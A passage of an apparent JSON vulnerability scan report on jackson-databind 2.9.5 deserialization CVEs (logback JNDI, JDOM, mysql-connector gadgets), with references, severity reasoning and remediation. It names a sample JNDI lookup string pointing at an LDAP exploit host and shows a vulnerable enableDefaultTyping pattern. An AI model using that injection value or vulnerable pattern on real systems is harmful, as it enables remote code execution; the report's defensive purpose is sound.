request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the `ch.qos.logback.core.db.JNDIConnectionSource ` gadget in [logback]( https://github.com/qos-ch/logback), the attacker can call `lookup` with an arbitrary location by  \nsetting `jndiLocation` with an arbitrary argument like `\"ldap://127.0.0.1:1088/Exploit\"` and then execute it by calling `getConnection`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` logback ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` logback ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `logback` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-12814",
            "cvss_v2_score": "4.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
            "cvss_v3_score": "5.9",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x through 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has JDOM 1.x or 2.x jar in the classpath, an attacker can send a specifically crafted JSON message that allows them to read arbitrary local files on the server.",
        "severity": "Medium",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.9.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-84203",
        "references": [
          "https://lists.apache.org/thread.html/e0733058c0366b703e6757d8d2a7a04b943581f659e9c271f0841dfe%40%3Cnotifications.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3297",
          "https://lists.apache.org/thread.html/a78239b1f11cddfa86e4edee19064c40b6272214630bfef070c37957%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/28be28ffd6471d230943a255c36fe196a54ef5afc494a4781d16e37c%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/8fe2983f6d9fee0aa737e4bd24483f8f5cf9b938b9adad0c4e79b2a4@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/bf20574dbc2db255f1fd489942b5720f675e32a2c4f44eb6a36060cd@%3Ccommits.accumulo.apache.org%3E",
          "https://lists.apache.org/thread.html/129da0204c876f746636018751a086cc581e0e07bcdeb3ee22ff5731@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/a3ae8a8c5e32c413cd27071d3a204166050bf79ce7f1299f6866338f%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/a3ae8a8c5e32c413cd27071d3a204166050bf79ce7f1299f6866338f@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/a62aa2706105d68f1c02023fe24aaa3c13b4d8a1826181fed07d9682@%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/5f7c69bba07a7155adde130d9dee2e54a54f1fa5",
          "https://lists.apache.org/thread.html/71f9ffd92410a889e27b95a219eaa843fd820f8550898633d85d4ea3%40%3Cissues.zookeeper.apache.org%3E",
          "https://github.com/advisories/GHSA-cmfg-87vq-g5g4",
          "https://lists.apache.org/thread.html/129da0204c876f746636018751a086cc581e0e07bcdeb3ee22ff5731%40%3Cdev.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://access.redhat.com/errata/RHSA-2019:3292",
          "https://access.redhat.com/errata/RHSA-2019:3044",
          "https://lists.apache.org/thread.html/2ff264b6a94c5363a35c4c88fa93216f60ec54d1d973ed6b76a9f560%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b@%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/bf20574dbc2db255f1fd489942b5720f675e32a2c4f44eb6a36060cd%40%3Ccommits.accumulo.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC/",
          "https://lists.debian.org/debian-lts-announce/2019/06/msg00019.html",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef%40%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4@%3Cdev.tomee.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190625-0006/",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9@%3Cdev.tomee.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190625-0006",
          "https://github.com/FasterXML/jackson-databind/issues/2341",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/eff7280055fc717ea8129cd28a9dd57b8446d00b36260c1caee10b87@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/4b832d1327703d6b287a6d223307f8f884d798821209a10647e93324%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://lists.apache.org/thread.html/b0a2b2cca072650dbd5882719976c3d353972c44f6736ddf0ba95209@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/a62aa2706105d68f1c02023fe24aaa3c13b4d8a1826181fed07d9682%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/eff7280055fc717ea8129cd28a9dd57b8446d00b36260c1caee10b87%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3050",
          "https://lists.apache.org/thread.html/b0a2b2cca072650dbd5882719976c3d353972c44f6736ddf0ba95209%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/15a55e1d837fa686db493137cc0330c7ee1089ed9a9eea7ae7151ef1@%3Cissues.zookeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2937",
          "https://lists.apache.org/thread.html/71f9ffd92410a889e27b95a219eaa843fd820f8550898633d85d4ea3@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef@%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/2ff264b6a94c5363a35c4c88fa93216f60ec54d1d973ed6b76a9f560@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/4b832d1327703d6b287a6d223307f8f884d798821209a10647e93324@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9%40%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3046",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b%40%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/e0733058c0366b703e6757d8d2a7a04b943581f659e9c271f0841dfe@%3Cnotifications.geode.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://access.redhat.com/errata/RHSA-2019:2935",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/8fe2983f6d9fee0aa737e4bd24483f8f5cf9b938b9adad0c4e79b2a4%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/b148fa2e9ef468c4de00de255dd728b74e2a97d935f8ced31eb41ba2@%3Cnotifications.zookeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2936",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/15a55e1d837fa686db493137cc0330c7ee1089ed9a9eea7ae7151ef1%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/1e04d9381c801b31ab28dec813c31c304b2a596b2a3707fa5462c5c0@%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/b148fa2e9ef468c4de00de255dd728b74e2a97d935f8ced31eb41ba2%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/a78239b1f11cddfa86e4edee19064c40b6272214630bfef070c37957@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/1e04d9381c801b31ab28dec813c31c304b2a596b2a3707fa5462c5c0%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-12814",
          "https://access.redhat.com/errata/RHSA-2019:3045",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/28be28ffd6471d230943a255c36fe196a54ef5afc494a4781d16e37c@%3Cissues.zookeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2938",
          "https://access.redhat.com/errata/RHSA-2019:2858"
        ],
        "extended_information": {
          "short_description": "A typing issue in Jackson-databind allows remote attacker to leak data when the service has JDOM in the Java classpath.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with [JDOM]( https://github.com/hunterhacker/jdom) gadget, the attacker can craft a special JSON request and lead to arbitrary read via unknown class inside `JDOM` plugin.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` JDOM ` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
              "description": "There is a [technical write-up](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062) where the vulnerability is explained, details how to trigger it and how to avoid it."
            },
            {
              "name": "The issue has an exploit published",
              "description": "There is a published [full RCE exploit](https://github.com/Al1ex/CVE-2019-12814)"
            },
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "Data leakage",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n- Default typing enabled for external JSON endpoints\n- The service deserializes objects with nominal type of `java.lang.Object`\n- The service includes `JDOM` in its Java classpath",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `JDOM` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-12086",
            "cvss_v2_score": "5.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint, the service has the mysql-connector-java jar (8.0.14 or earlier) in the classpath, and an attacker can host a crafted MySQL server reachable by the victim, an attacker can send a crafted JSON message that allows them to read arbitrary local files on the server. This occurs because of missing com.mysql.cj.jdbc.admin.MiniAdmin validation.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.9]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-82052",
        "references": [
          "http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/",
          "https://access.redhat.com/errata/RHSA-2019:2935",
          "https://lists.debian.org/debian-lts-announce/2019/05/msg00030.html",
          "https://access.redhat.com/errata/RHSA-2019:2936",
          "https://access.redhat.com/errata/RHSA-2019:2937",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.apache.org/thread.html/rda99599896c3667f2cc9e9d34c7b6ef5d2bbed1f4801e1d75a2b0679%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://web.archive.org/web/20200808181049/http://russiansecurity.expert/2016/04/20/mysql-connect-file-read",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544",
          "https://github.com/FasterXML/jackson-databind/issues/2326",
          "https://lists.apache.org/thread.html/rda99599896c3667f2cc9e9d34c7b6ef5d2bbed1f4801e1d75a2b0679@%3Ccommits.nifi.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.9",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://access.redhat.com/errata/RHSA-2019:2998",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC",
          "https://access.redhat.com/errata/RHSA-2019:3045",
          "https://access.redhat.com/errata/RHSA-2019:3044",
          "https://access.redhat.com/errata/RHSA-2019:3046",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-12086",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "http://www.securityfocus.com/bid/109227",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://access.redhat.com/errata/RHSA-2019:3050",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/r204ba2a9ea750f38d789d2bb429cc0925ad6133deea7cbc3001d96b5@%3Csolr-user.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2938",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/d30f036208ab1c60bd5ce429cb4f7f1a3e5682e8",
          "https://web.archive.org/web/20200227030031/http://www.securityfocus.com/bid/109227",
          "https://github.com/FasterXML/jackson-databind/commit/efc3c0d02f4743dbaa6d1b9c466772a2f13d966b",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/88cd25375805950ae7337e669b0cb0eeda98b9604c1b8d806dccbad2@%3Creviews.spark.apache.org%3E",
          "https://github.com/advisories/GHSA-5ww9-j83m-q7qx",
          "https://lists.apache.org/thread.html/88cd25375805950ae7337e669b0cb0eeda98b9604c1b8d806dccbad2%40%3Creviews.spark.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/dda513bd7251b4f32b7b60b1c13740e3b5a43024",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/r204ba2a9ea750f38d789d2bb429cc0925ad6133deea7cbc3001d96b5%40%3Csolr-user.lucene.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC/"
        ],
        "extended_information": {
          "short_description": "A typing issue in mysql-connector-java in Jackson-databind allows a remote attacker to leak file contents.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, because of missing `com.mysql.cj.jdbc.admin.MiniAdmin` in [mysql-connector]( https://github.com/mysql/mysql-connector-j), the attacker can craft special JSON request and read arbitrary local files on the server.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` mysql-connector-java` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has an exploit published"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` mysql-connector-java` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            }
          ],
